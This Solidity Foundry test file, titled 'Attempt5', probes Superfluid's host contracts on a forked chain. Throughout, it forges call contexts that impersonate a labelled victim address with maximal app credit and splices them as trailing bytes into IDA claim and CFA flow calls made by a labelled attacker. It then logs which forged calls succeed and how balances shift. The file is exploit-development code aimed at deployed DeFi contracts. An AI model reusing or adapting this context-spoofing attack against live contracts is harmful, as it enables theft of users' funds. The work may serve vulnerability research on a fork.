// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import {stdJson} from "forge-std/StdJson.sol";
import {ContextUtils} from "reference/ContextUtils.sol";

interface ISuperAgreement {}

interface ISuperToken {
    function balanceOf(address account) external view returns (uint256);
    function getHost() external view returns (address);
}

interface ISETH is ISuperToken {
    function upgradeByETH() external payable;
}

interface ISuperfluidHost {
    function callAgreement(
        ISuperAgreement agreementClass,
        bytes calldata callData,
        bytes calldata userData
    ) external returns (bytes memory returnedData);

    function isApp(address app) external view returns (bool);

    function getAppManifest(address app) external view returns (bool isSuperApp, bool isJailed, uint256 noopMask);
}

interface IInstantDistributionAgreementV1 is ISuperAgreement {
    function createIndex(
        ISuperToken token,
        uint32 indexId,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function updateSubscription(
        ISuperToken token,
        uint32 indexId,
        address subscriber,
        uint128 units,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function updateIndex(
        ISuperToken token,
        uint32 indexId,
        uint128 indexValue,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function claim(
        ISuperToken token,
        address publisher,
        uint32 indexId,
        address subscriber,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function getSubscription(
        ISuperToken token,
        address publisher,
        uint32 indexId,
        address subscriber
    ) external view returns (bool exist, bool approved, uint128 units, uint256 pendingDistribution);
}

interface IConstantFlowAgreementV1 is ISuperAgreement {
    function createFlow(
        ISuperToken token,
        address receiver,
        int96 flowRate,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function updateFlow(
        ISuperToken token,
        address receiver,
        int96 flowRate,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function deleteFlow(
        ISuperToken token,
        address sender,
        address receiver,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);
}

/// @title Attempt5
/// @notice Hypothesis: the surviving host-spliced `claim()` primitive becomes
///         materially different once the subscriber is a real registered
///         SuperApp we wire up ourselves. This attempt:
///         1. seeds legitimate pending MATICx claims for every non-jailed
///            historical SuperApp recovered in Attempt4,
///         2. compares plain-vs-forged host `claim()` behavior against an EOA
///            baseline using concrete observables (claim success, logs,
///            subscriber balance delta, returned ctx),
///         3. runs a small CFA matrix to confirm whether nearby
///            `createFlow/updateFlow/deleteFlow` paths still reject trailing
///            forged ctx on the patched fork.
contract Attempt5 is Test {
    using stdJson for string;

    struct SeedResult {
        bool ok;
        uint8 failedStep;
        bytes revertData;
    }

    struct ClaimProbeResult {
        bool ok;
        uint256 pendingBefore;
        uint256 pendingAfter;
        int256 subscriberDelta;
        uint256 logCount;
        uint256 appLogCount;
        uint256 returnDataLength;
        bytes32 returnDataHash;
        bytes4 revertSelector;
    }

    struct ScanStats {
        uint256 totalHistoricalApps;
        uint256 liveApps;
        uint256 jailedApps;
        uint256 seedSuccesses;
        uint256 seedFailures;
        uint256 plainOk;
        uint256 forgedOk;
        uint256 plainDifferentFromBaseline;
        uint256 forgedDifferentFromBaseline;
        uint256 plainAppLogs;
        uint256 forgedAppLogs;
        uint256 detailedLogs;
    }

    struct BaselineResults {
        ClaimProbeResult plain;
        ClaimProbeResult forged;
    }

    struct SimplestApp {
        address app;
        uint256 codeSize;
        uint256 noopMask;
    }

    address constant ATTACKER = 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14;
    address constant KNOWN_USDCX_VICTIM = 0x2e9e3C24049655f2D8C59f08602Da3DE4aD34188;
    uint256 constant FORK_BLOCK = 27_039_967;

    uint32 constant BASELINE_PLAIN_INDEX_ID = 55_500_000;
    uint32 constant BASELINE_FORGED_INDEX_ID = 55_500_001;
    uint32 constant APP_SCAN_INDEX_BASE = 55_510_000;
    uint32 constant SIMPLEST_INDEX_BASE = 55_520_000;
    int96 constant FLOW_RATE = 1;

    ISuperfluidHost constant HOST = ISuperfluidHost(0x3E14dC1b13c488a8d5D310918780c983bD5982E7);
    IInstantDistributionAgreementV1 constant IDA =
        IInstantDistributionAgreementV1(0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1);
    IConstantFlowAgreementV1 constant CFA =
        IConstantFlowAgreementV1(0x6EeE6060f715257b970700bc2656De21dEdF074C);

    ISETH constant MATICX = ISETH(0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3);
    ISuperToken constant USDCX = ISuperToken(0xCAa7349CEA390F89641fe306D93591f87595dc1F);

    address internal flowReceiverCreate;
    address internal flowReceiverUpdate;
    address internal flowReceiverDelete;

    function setUp() public {
        vm.createSelectFork("ch5", FORK_BLOCK);
        flowReceiverCreate = makeAddr("flowReceiverCreate");
        flowReceiverUpdate = makeAddr("flowReceiverUpdate");
        flowReceiverDelete = makeAddr("flowReceiverDelete");

        vm.label(ATTACKER, "Attacker");
        vm.label(KNOWN_USDCX_VICTIM, "KnownUSDCxVictim");
        vm.label(address(HOST), "SuperfluidHost");
        vm.label(address(IDA), "IDA");
        vm.label(address(CFA), "CFA");
        vm.label(address(MATICX), "MATICx");
        vm.label(address(USDCX), "USDCx");
        vm.label(flowReceiverCreate, "FlowReceiverCreate");
        vm.label(flowReceiverUpdate, "FlowReceiverUpdate");
        vm.label(flowReceiverDelete, "FlowReceiverDelete");
    }

    function test_registered_superapp_subscriber_claim_matrix() public {
        uint256 nativeBefore = ATTACKER.balance;
        string memory json = vm.readFile("recon/app_addresses.json");
        address[] memory apps = json.readAddressArray(".addresses");

        console.log("[start] attacker native:", nativeBefore);
        console.log("[preflight] chain id:", block.chainid);
        console.log("[preflight] fork block:", block.number);
        console.log("[preflight] MATICx host:", MATICX.getHost());
        console.log("[scan] historical AppRegistered addresses:", apps.length);

        _fundAttacker();

        BaselineResults memory baseline = _runBaselineProbes();
        (ScanStats memory stats, SimplestApp memory simplest) = _scanRegisteredApps(apps, baseline);

        console.log("[summary] live historical apps still registered:", stats.liveApps);
        console.log("[summary] live apps jailed:", stats.jailedApps);
        console.log("[summary] subscriber seed successes:", stats.seedSuccesses);
        console.log("[summary] subscriber seed failures:", stats.seedFailures);
        console.log("[summary] plain claim ok count:", stats.plainOk);
        console.log("[summary] forged claim ok count:", stats.forgedOk);
        console.log("[summary] plain claim differed from EOA baseline:", stats.plainDifferentFromBaseline);
        console.log("[summary] forged claim differed from EOA baseline:", stats.forgedDifferentFromBaseline);
        console.log("[summary] plain claim emitted subscriber logs:", stats.plainAppLogs);
        console.log("[summary] forged claim emitted subscriber logs:", stats.forgedAppLogs);

        _runSimplestAppDetailedProbe(simplest);

        _runCfaSurfaceMatrix();

        uint256 nativeAfter = ATTACKER.balance;
        int256 nativeDelta = int256(nativeAfter) - int256(nativeBefore);
        console.log("[end] attacker native:", nativeAfter);
        console.log("[delta] attacker native:", nativeDelta);
    }

    function _runBaselineProbes() internal returns (BaselineResults memory baseline) {
        bytes memory baselineForgedCtx = _buildFakeClaimContext(ATTACKER, address(MATICX), 0);
        _seedSubscriptionOrRevert(ATTACKER, BASELINE_PLAIN_INDEX_ID);
        _seedSubscriptionOrRevert(ATTACKER, BASELINE_FORGED_INDEX_ID);

        baseline.plain = _probeClaim(ATTACKER, BASELINE_PLAIN_INDEX_ID, false, bytes(""));
        baseline.forged = _probeClaim(ATTACKER, BASELINE_FORGED_INDEX_ID, true, baselineForgedCtx);

        _logClaimProbe("baseline_eoa_plain", ATTACKER, 0, 0, baseline.plain);
        _logClaimProbe("baseline_eoa_forged", ATTACKER, 0, 0, baseline.forged);

        assertTrue(baseline.plain.ok, "baseline plain host claim regressed");
        assertTrue(baseline.forged.ok, "baseline forged host claim regressed");
        assertGt(baseline.plain.pendingBefore, 0, "baseline plain should start with pending claim");
        assertEq(baseline.plain.pendingAfter, 0, "baseline plain should consume pending claim");
        assertGt(baseline.forged.pendingBefore, 0, "baseline forged should start with pending claim");
        assertEq(baseline.forged.pendingAfter, 0, "baseline forged should consume pending claim");
        assertGt(baseline.forged.returnDataLength, 0, "forged claim should return ctx bytes");
    }

    function _scanRegisteredApps(
        address[] memory apps,
        BaselineResults memory baseline
    ) internal returns (ScanStats memory stats, SimplestApp memory simplest) {
        stats.totalHistoricalApps = apps.length;
        simplest.codeSize = type(uint256).max;

        for (uint256 i = 0; i < apps.length; ++i) {
            address app = apps[i];
            bool hostIsApp = HOST.isApp(app);
            (bool manifestIsSuperApp, bool isJailed, uint256 noopMask) = HOST.getAppManifest(app);

            if (!hostIsApp || !manifestIsSuperApp) continue;

            stats.liveApps += 1;
            if (isJailed) {
                stats.jailedApps += 1;
                continue;
            }

            uint256 codeSize = app.code.length;
            uint32 plainIndexId = uint32(APP_SCAN_INDEX_BASE + (i * 2));
            uint32 forgedIndexId = uint32(APP_SCAN_INDEX_BASE + (i * 2) + 1);

            SeedResult memory seedPlain = _trySeedSubscription(app, plainIndexId);
            SeedResult memory seedForged = _trySeedSubscription(app, forgedIndexId);
            if (!seedPlain.ok || !seedForged.ok) {
                stats.seedFailures += 1;
                if (stats.detailedLogs < 8) {
                    SeedResult memory failedSeed = seedPlain.ok ? seedForged : seedPlain;
                    console.log("[seed-fail] app:", app);
                    console.log("  codeSize:", codeSize);
                    console.log("  noopMask:", noopMask);
                    console.log("  step:", uint256(failedSeed.failedStep));
                    console.log("  revert:");
                    console.logBytes(failedSeed.revertData);
                    console.log("  decoded:");
                    console.log(_decodeRevert(failedSeed.revertData));
                    stats.detailedLogs += 1;
                }
                continue;
            }

            stats.seedSuccesses += 1;
            if (codeSize < simplest.codeSize) {
                simplest = SimplestApp({app: app, codeSize: codeSize, noopMask: noopMask});
            }

            bytes memory forgedCtx = _buildFakeClaimContext(app, address(MATICX), 0);
            ClaimProbeResult memory plain = _probeClaim(app, plainIndexId, false, bytes(""));
            ClaimProbeResult memory forged = _probeClaim(app, forgedIndexId, true, forgedCtx);

            if (plain.ok) stats.plainOk += 1;
            if (forged.ok) stats.forgedOk += 1;
            if (plain.appLogCount > 0) stats.plainAppLogs += 1;
            if (forged.appLogCount > 0) stats.forgedAppLogs += 1;
            if (_differsFromBaseline(plain, baseline.plain)) stats.plainDifferentFromBaseline += 1;
            if (_differsFromBaseline(forged, baseline.forged)) stats.forgedDifferentFromBaseline += 1;

            if (
                stats.detailedLogs < 20
                    && (
                        !plain.ok || !forged.ok || plain.appLogCount > 0 || forged.appLogCount > 0
                            || _differsFromBaseline(plain, baseline.plain)
                            || _differsFromBaseline(forged, baseline.forged)
                    )
            ) {
                _logClaimProbe("scan_plain", app, codeSize, noopMask, plain);
                _logClaimProbe("scan_forged", app, codeSize, noopMask, forged);
                stats.detailedLogs += 1;
            }
        }
    }

    function _runSimplestAppDetailedProbe(SimplestApp memory simplest) internal {
        if (simplest.app == address(0)) {
            console.log("[simplest] no non-jailed app accepted a fresh subscription seed");
            return;
        }

        console.log("[simplest] seeded non-jailed SuperApp:", simplest.app);
        console.log("[simplest] codeSize:", simplest.codeSize);
        console.log("[simplest] noopMask:", simplest.noopMask);

        _seedSubscriptionOrRevert(simplest.app, SIMPLEST_INDEX_BASE);
        _seedSubscriptionOrRevert(simplest.app, SIMPLEST_INDEX_BASE + 1);
        _seedSubscriptionOrRevert(simplest.app, SIMPLEST_INDEX_BASE + 2);
        _seedSubscriptionOrRevert(simplest.app, SIMPLEST_INDEX_BASE + 3);

        _logClaimProbe(
            "simplest_plain",
            simplest.app,
            simplest.codeSize,
            simplest.noopMask,
            _probeClaim(simplest.app, SIMPLEST_INDEX_BASE, false, bytes(""))
        );
        _logClaimProbe(
            "simplest_forged_self_maticx",
            simplest.app,
            simplest.codeSize,
            simplest.noopMask,
            _probeClaim(
                simplest.app,
                SIMPLEST_INDEX_BASE + 1,
                true,
                _buildFakeClaimContext(simplest.app, address(MATICX), 0)
            )
        );
        _logClaimProbe(
            "simplest_forged_self_usdcx",
            simplest.app,
            simplest.codeSize,
            simplest.noopMask,
            _probeClaim(
                simplest.app,
                SIMPLEST_INDEX_BASE + 2,
                true,
                _buildFakeClaimContext(simplest.app, address(USDCX), 0)
            )
        );
        _logClaimProbe(
            "simplest_forged_attacker_maticx",
            simplest.app,
            simplest.codeSize,
            simplest.noopMask,
            _probeClaim(
                simplest.app,
                SIMPLEST_INDEX_BASE + 3,
                true,
                _buildFakeClaimContext(ATTACKER, address(MATICX), 0)
            )
        );
    }

    function _fundAttacker() internal {
        vm.prank(ATTACKER);
        MATICX.upgradeByETH{value: 3 ether}();
    }

    function _seedSubscriptionOrRevert(address subscriber, uint32 indexId) internal {
        SeedResult memory seed = _trySeedSubscription(subscriber, indexId);
        require(seed.ok, string.concat("seed failed: ", _decodeRevert(seed.revertData)));
    }

    function _trySeedSubscription(address subscriber, uint32 indexId) internal returns (SeedResult memory seed) {
        vm.startPrank(ATTACKER);

        (seed.ok, seed.revertData) =
            _callAgreementRaw(abi.encodeCall(IDA.createIndex, (MATICX, indexId, new bytes(0))));
        if (!seed.ok) {
            seed.failedStep = 1;
            vm.stopPrank();
            return seed;
        }

        (seed.ok, seed.revertData) = _callAgreementRaw(
            abi.encodeCall(IDA.updateSubscription, (MATICX, indexId, subscriber, uint128(1), new bytes(0)))
        );
        if (!seed.ok) {
            seed.failedStep = 2;
            vm.stopPrank();
            return seed;
        }

        (seed.ok, seed.revertData) =
            _callAgreementRaw(abi.encodeCall(IDA.updateIndex, (MATICX, indexId, uint128(1), new bytes(0))));
        if (!seed.ok) {
            seed.failedStep = 3;
            vm.stopPrank();
            return seed;
        }

        vm.stopPrank();
    }

    function _probeClaim(
        address subscriber,
        uint32 indexId,
        bool useTrailing,
        bytes memory fakeCtx
    ) internal returns (ClaimProbeResult memory probe) {
        uint256 subscriberBalanceBefore = MATICX.balanceOf(subscriber);
        (,, , probe.pendingBefore) = IDA.getSubscription(MATICX, ATTACKER, indexId, subscriber);

        bytes memory ret;
        (probe.ok, ret, probe.logCount, probe.appLogCount) =
            _executeClaimCall(subscriber, indexId, useTrailing, fakeCtx);
        probe.returnDataLength = ret.length;
        probe.returnDataHash = keccak256(ret);
        if (!probe.ok && ret.length >= 4) {
            bytes4 revertSelector;
            assembly {
                revertSelector := mload(add(ret, 32))
            }
            probe.revertSelector = revertSelector;
        }

        if (probe.ok) {
            probe.subscriberDelta = int256(MATICX.balanceOf(subscriber)) - int256(subscriberBalanceBefore);
            (,, , probe.pendingAfter) = IDA.getSubscription(MATICX, ATTACKER, indexId, subscriber);
        } else {
            probe.pendingAfter = probe.pendingBefore;
        }
    }

    function _executeClaimCall(
        address subscriber,
        uint32 indexId,
        bool useTrailing,
        bytes memory fakeCtx
    ) internal returns (bool ok, bytes memory ret, uint256 logCount, uint256 appLogCount) {
        vm.recordLogs();
        vm.prank(ATTACKER);
        if (useTrailing) {
            (ok, ret) = _callAgreementWithTrailingBytes(
                abi.encodeCall(IDA.claim, (MATICX, ATTACKER, indexId, subscriber, fakeCtx))
            );
        } else {
            (ok, ret) =
                _callAgreementRaw(abi.encodeCall(IDA.claim, (MATICX, ATTACKER, indexId, subscriber, new bytes(0))));
        }

        Vm.Log[] memory logs = vm.getRecordedLogs();
        logCount = logs.length;
        appLogCount = _countLogsFrom(logs, subscriber);
    }

    function _runCfaSurfaceMatrix() internal {
        console.log("[cfa] begin create/update/delete surface matrix");

        bytes memory forgedCreateCtx = _buildForgedAgreementContext(CFA.createFlow.selector);
        bytes memory forgedUpdateCtx = _buildForgedAgreementContext(CFA.updateFlow.selector);
        bytes memory forgedDeleteCtx = _buildForgedAgreementContext(CFA.deleteFlow.selector);

        vm.prank(ATTACKER);
        (bool directCreateOk, bytes memory directCreateRet) = address(CFA).call(
            abi.encodeCall(CFA.createFlow, (MATICX, flowReceiverCreate, FLOW_RATE, new bytes(0)))
        );
        _logCall("cfa_direct_create_flow", directCreateOk, directCreateRet);

        vm.prank(ATTACKER);
        (bool plainCreateOk, bytes memory plainCreateRet) =
            _callCfaAgreementRaw(abi.encodeCall(CFA.createFlow, (MATICX, flowReceiverCreate, FLOW_RATE, new bytes(0))));
        _logCall("cfa_host_plain_create_flow", plainCreateOk, plainCreateRet);

        vm.prank(ATTACKER);
        (bool forgedCreateOk, bytes memory forgedCreateRet) = _callCfaAgreementWithTrailingBytes(
            abi.encodeCall(CFA.createFlow, (MATICX, flowReceiverCreate, FLOW_RATE, forgedCreateCtx))
        );
        _logCall("cfa_host_trailing_create_flow", forgedCreateOk, forgedCreateRet);

        if (!plainCreateOk) {
            console.log("[cfa] plain createFlow failed; skipping update/delete probes");
            return;
        }

        vm.startPrank(ATTACKER);
        (bool createFlowOk, bytes memory createFlowRet) =
            _callCfaAgreementRaw(abi.encodeCall(CFA.createFlow, (MATICX, flowReceiverUpdate, FLOW_RATE, new bytes(0))));
        require(createFlowOk, string.concat("plain createFlow setup failed: ", _decodeRevert(createFlowRet)));
        (bool createDeleteFlowOk, bytes memory createDeleteFlowRet) =
            _callCfaAgreementRaw(abi.encodeCall(CFA.createFlow, (MATICX, flowReceiverDelete, FLOW_RATE, new bytes(0))));
        require(createDeleteFlowOk, string.concat("plain createFlow delete-setup failed: ", _decodeRevert(createDeleteFlowRet)));
        vm.stopPrank();

        vm.prank(ATTACKER);
        (bool forgedUpdateOk, bytes memory forgedUpdateRet) = _callCfaAgreementWithTrailingBytes(
            abi.encodeCall(CFA.updateFlow, (MATICX, flowReceiverUpdate, FLOW_RATE + 1, forgedUpdateCtx))
        );
        _logCall("cfa_host_trailing_update_flow", forgedUpdateOk, forgedUpdateRet);

        vm.prank(ATTACKER);
        (bool forgedDeleteOk, bytes memory forgedDeleteRet) = _callCfaAgreementWithTrailingBytes(
            abi.encodeCall(CFA.deleteFlow, (MATICX, ATTACKER, flowReceiverDelete, forgedDeleteCtx))
        );
        _logCall("cfa_host_trailing_delete_flow", forgedDeleteOk, forgedDeleteRet);
    }

    function _callAgreementRaw(bytes memory inner) internal returns (bool ok, bytes memory ret) {
        return address(HOST).call(abi.encodeCall(HOST.callAgreement, (IDA, inner, new bytes(0))));
    }

    function _callAgreementWithTrailingBytes(bytes memory inner) internal returns (bool ok, bytes memory ret) {
        bytes memory outer = abi.encodePacked(inner, abi.encode(new bytes(0)));
        return address(HOST).call(abi.encodeCall(HOST.callAgreement, (IDA, outer, new bytes(0))));
    }

    function _callCfaAgreementRaw(bytes memory inner) internal returns (bool ok, bytes memory ret) {
        return address(HOST).call(abi.encodeCall(HOST.callAgreement, (CFA, inner, new bytes(0))));
    }

    function _callCfaAgreementWithTrailingBytes(bytes memory inner) internal returns (bool ok, bytes memory ret) {
        bytes memory outer = abi.encodePacked(inner, abi.encode(new bytes(0)));
        return address(HOST).call(abi.encodeCall(HOST.callAgreement, (CFA, outer, new bytes(0))));
    }

    function _buildFakeClaimContext(
        address appAddress,
        address appCreditToken,
        int256 appCreditUsed
    ) internal view returns (bytes memory) {
        ContextUtils.Context memory ctx = ContextUtils.buildContext(KNOWN_USDCX_VICTIM, IDA.claim.selector, "");
        ctx.appCreditGranted = type(uint128).max;
        ctx.appCreditUsed = appCreditUsed;
        ctx.appAddress = appAddress;
        ctx.appCreditToken = appCreditToken;
        return ContextUtils.encodeContext(ctx);
    }

    function _buildForgedAgreementContext(bytes4 selector) internal view returns (bytes memory) {
        ContextUtils.Context memory ctx = ContextUtils.buildContext(KNOWN_USDCX_VICTIM, selector, "");
        return ContextUtils.encodeContext(ctx);
    }

    function _differsFromBaseline(
        ClaimProbeResult memory lhs,
        ClaimProbeResult memory rhs
    ) internal pure returns (bool) {
        return lhs.ok != rhs.ok || lhs.logCount != rhs.logCount || lhs.appLogCount != rhs.appLogCount
            || lhs.subscriberDelta != rhs.subscriberDelta || lhs.pendingAfter != rhs.pendingAfter;
    }

    function _countLogsFrom(Vm.Log[] memory logs, address emitter) internal pure returns (uint256 count) {
        for (uint256 i = 0; i < logs.length; ++i) {
            if (logs[i].emitter == emitter) {
                count += 1;
            }
        }
    }

    function _logClaimProbe(
        string memory label,
        address subscriber,
        uint256 codeSize,
        uint256 noopMask,
        ClaimProbeResult memory probe
    ) internal view {
        console.log("[probe]", label);
        console.log("  subscriber:", subscriber);
        if (codeSize > 0) {
            console.log("  codeSize:", codeSize);
            console.log("  noopMask:", noopMask);
        }
        console.log("  ok:", probe.ok);
        console.log("  pendingBefore:", probe.pendingBefore);
        console.log("  pendingAfter:", probe.pendingAfter);
        console.log("  subscriberDelta:", probe.subscriberDelta);
        console.log("  logCount:", probe.logCount);
        console.log("  appLogCount:", probe.appLogCount);
        console.log("  returnDataLength:", probe.returnDataLength);
        console.logBytes32(probe.returnDataHash);
        if (probe.ok) {
            console.log("  revertSelector:", uint256(uint32(probe.revertSelector)));
        } else {
            console.log("  revertSelector:", uint256(uint32(probe.revertSelector)));
        }
    }

    function _logCall(string memory label, bool ok, bytes memory ret) internal pure {
        console.log("[call]", label);
        console.log("  ok:", ok);
        if (ok) {
            if (ret.length > 0) {
                console.log("  wrapped return bytes:");
                console.logBytes(ret);
            }
        } else {
            console.log("  revert:");
            console.logBytes(ret);
            console.log("  decoded:");
            console.log(_decodeRevert(ret));
        }
    }

    function _decodeRevert(bytes memory revertData) internal pure returns (string memory) {
        if (revertData.length < 4) {
            if (revertData.length == 0) {
                return "silent revert";
            }
            return string(revertData);
        }

        bytes4 selector;
        assembly {
            selector := mload(add(revertData, 32))
        }

        if (selector == 0x08c379a0 && revertData.length >= 68) {
            assembly {
                revertData := add(revertData, 4)
            }
            return abi.decode(revertData, (string));
        }

        if (selector == 0x4e487b71) {
            return "panic";
        }

        return "custom/unknown";
    }
}
